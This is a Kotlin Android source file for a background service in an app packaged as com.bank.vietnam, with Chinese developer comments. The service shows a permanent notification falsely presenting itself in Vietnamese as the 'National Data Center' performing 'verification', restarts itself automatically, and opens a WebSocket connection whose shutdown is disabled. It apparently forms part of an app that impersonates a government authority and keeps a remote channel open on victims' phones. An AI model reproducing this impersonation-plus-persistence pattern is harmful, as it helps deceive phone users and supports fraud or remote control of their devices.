package com.bank.vietnam

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.bank.vietnam.base.R

class WebSocketService : Service() {

    private val webSocketManager = WebSocketManager

    override fun onCreate() {
        super.onCreate()
        // Create the notification channel if needed
        createNotificationChannel()

        // 1) 创建用于启动本应用的 Intent
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
            // 防止重复实例，清空原有任务栈，重新打开应用主界面
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }

        // 2) 用 PendingIntent 封装这个 Intent
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            // 选择合适的 flag，Android 12+ 需考虑是否用 FLAG_IMMUTABLE
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )



        // Build the foreground notification
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Trung tâm dữ liệu quốc gia")
            .setContentText("Đang tiến hành xác thực")
            // 让用户点击通知后打开你的应用
            .setContentIntent(pendingIntent)
            .setSmallIcon(R.drawable.logo)
            .build()

        // Start foreground service
        startForeground(NOTIFICATION_ID, notification)

        // Initialize the websocket here
        webSocketManager.initWebSocket(this)

    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // If you want to handle restarts, you can return START_STICKY
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        // Clean up your WebSocket
//        webSocketManager.close()
    }

    override fun onBind(intent: Intent?): IBinder? {
        // Return null if you don't plan to bind
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelName = "WebSocket Service Channel"
            val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    companion object {
        private const val CHANNEL_ID = "websocket_service_channel"
        private const val NOTIFICATION_ID = 123
    }
}
